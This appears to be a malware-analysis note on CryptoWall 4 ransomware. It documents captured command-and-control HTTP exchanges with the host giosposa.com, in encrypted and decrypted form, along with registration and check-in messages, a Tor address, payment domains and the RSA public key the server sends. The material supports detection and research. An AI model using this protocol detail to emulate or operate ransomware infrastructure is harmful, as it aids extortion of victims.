# CryptoWall4 C&C

Reference sample: 0f40c359d5dcc597ef5d2313aeed686667b0e14f600b45197723e3b09ba50a62 [[VirusTotal]](https://www.virustotal.com/en/file/0f40c359d5dcc597ef5d2313aeed686667b0e14f600b45197723e3b09ba50a62/analysis/) [[Payload Security]](https://www.hybrid-analysis.com/sample/0f40c359d5dcc597ef5d2313aeed686667b0e14f600b45197723e3b09ba50a62?environmentId=1)

# Sample Communication

## 1. Client Registration (Encrypted)
```
POST /Zoe2aN.php?g=0hejz4z87l74 HTTP/1.1
Accept: */*
Content-Type: application/x-www-form-urlencoded
Connection: Close
Content-Length: 140
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
Host: giosposa.com
Cache-Control: no-cache

l=6d6b33347264373962376338627163531489d08691ba8d567d8621ff76f3d0d254df5f4e218a5ada0504b3a3949205850563b807ef5ab779a108b2ab8ca7b6773ab9552653

HTTP/1.1 200 OK
Date: Thu, 21 Jan 2016 19:03:19 GMT
Server: Apache
X-Powered-By: PHP/5.4.45
Connection: close
Transfer-Encoding: chunked
Content-Type: text/html

5314c08688d9b7
```

## 1. Client Registration (Decrypted)
```
Request: {1|crypt13001|1ADA39F9017BC8BE8633FAC3CA0D5A43|5|1|2|}
Response: {155|1}
```

## 2. Request for Public Key (Encrypted)
```
POST /Zoe2aN.php?b=dp7tm9rl3z09 HTTP/1.1
Accept: */*
Content-Type: application/x-www-form-urlencoded
Connection: Close
Content-Length: 128
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
Host: giosposa.com
Cache-Control: no-cache

z=647571383032373074706a3771698a5e1581a9341bf0f0d8cebb252aec8f7338e321aa3c140f55087f3db92351efcf999ce70d063065672d05f86193f9b940

HTTP/1.1 200 OK
Date: Thu, 21 Jan 2016 19:04:06 GMT
Server: Apache
X-Powered-By: PHP/5.4.45
Connection: close
Transfer-Encoding: chunked
Content-Type: text/html

8a581d86af3708b0bdd889f17a63adfc4e10a575843245550864536b920907a589d9a6d12f4c074b270849cd3ad3fcfb49fe0cc558b9d45616c741e676081a745778afc9f1c4d03019790ef961a518b99dbb557dfc9d964759599724cb224258db547d69486a5c093dcedc5d96d4615619e14c6caa97826219aeb36e6cffcda2a33ccb49b6b88712459a68e4fc69ba9ab9fade8b329fc668d38d471344cf1f3cf5e828647daac31664445ee47145f9e2aa7ff0158ee19896fd8305f6a491c069d8e960e3990d0c8439dd331460022f3f34479dd16df1ad0e7a.......truncated........c0eebbaf1e84281e9fd1aa2de687f23351d9bb71feee2e0e4a61183f571530a08808e68749909b68622945d39f8331e5f03a6e795d097cb5b65b516dabd3b0463f29ee11ad00855c7e78099002d811855f56c4c27c871dc
```

## 2. Request for Public Key (Decrypted)
```
Request: {7|crypt13001|1ADA39F9017BC8BE8633FAC3CA0D5A43|1}
Response: {1tdtzc4|3wzn5p2yiumh7akj.onion|us|waytopaytosystem.com~malkintop100.com~belladonnamonna.com~hiltonpaytoo.com|-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAw/VdY0UONl2uSs/JEkmC
fU9WaJVgwWJAqIznYUaHkr+oE3jBvhwzRzT8+CxgUWQY1P1NLuMEKopaRHLA0XI/
DYla8gqV2UZ8zxI4t90ZQeaMtKlEndWUc7w/rYJwoLjeGhM1U5ObpSwZzcs4j0ZV
k16BNYJokAN7nVCP882M4G3jCJfCdcOaM8IJkk0FuQU5aJYLWwk1M88+bBKqqNb8
w6GZekM0P1xiNq1sltU2vrZyG43xj6d6TK84dsmYBLRuSi9LJrdF3P6ASxFEkskM
GZ5di0/MyLw0V30U7QzHAtp7Ri8BdQ4nM3c6tSudYHPuwGJDtWMut0tiimxR+O2f
cQIDAQAB
-----END PUBLIC KEY-----|iVBORw0KGgoAAAANSUhEUgAAA68AAALKCAIAAABStPDjAAAgAElEQVR4nOy9PY/jRtb3ffxgQyZ2zycwNbISQQBxD4x1QMCAsbwg3KtEYDAR3TFHSWMTouOGEqMTtuIZRhMIAgzNBcFcGDCgwAvDNwgISmRZ3E8w8iT8AE/AtyJZxRdJ/TKj/w8dqMmqU6.......truncated........AAB3kYYBAADgri/mP378/P5R7QAAAADeH2PDAAAAcBdpGAAAAO4iDQMAAMBd/wINQtkAwZ8J/AAAAABJRU5ErkJggg==}
```

## 3. Post-Encryption Check-In - 1 (Encrypted)
```
POST /Zoe2aN.php?c=e6zub3y89v2bwh HTTP/1.1
Accept: */*
Content-Type: application/x-www-form-urlencoded
Connection: Close
Content-Length: 124
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
Host: giosposa.com
Cache-Control: no-cache

h=30356938303961637a7178347277987828c2917cde4e439b394dfb0761817197ceb538e8024b2cd9ab03ff08531d1faa0a08691ce8b90dc007bcc431b6

HTTP/1.1 200 OK
Date: Thu, 21 Jan 2016 19:04:33 GMT
Server: Apache
X-Powered-By: PHP/5.4.45
Connection: close
Transfer-Encoding: chunked
Content-Type: text/html

987967959e
```

## 3. Post-Encryption Check-In - 1 (Decrypted)
```
Request: {3|crypt13001|1ADA39F9017BC8BE8633FAC3CA0D5A43}
Response: {234}
```

## 4. Post-Encryption Check-In - 2 (Encrypted)
```
POST /Zoe2aN.php?t=5suo0ep2d0d2np HTTP/1.1
Accept: */*
Content-Type: application/x-www-form-urlencoded
Connection: Close
Content-Length: 113
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
Host: giosposa.com
Cache-Control: no-cache

p=32786830689caf9a157c762a555995606ada94c483f731e1a38b062043f9fa018ca97df6f0805ca0982f88d2ec617857c6090c58ef27b15

HTTP/1.1 200 OK
Date: Thu, 21 Jan 2016 19:04:38 GMT
Server: Apache
X-Powered-By: PHP/5.4.45
Connection: close
Transfer-Encoding: chunked
Content-Type: text/html

89ccf8
```

## 4. Post-Encryption Check-In - 2 (Decrypted)
```
Request: {7|crypt13001|1ADA39F9017BC8BE8633FAC3CA0D5A43|2|1}
Response: {1}
```
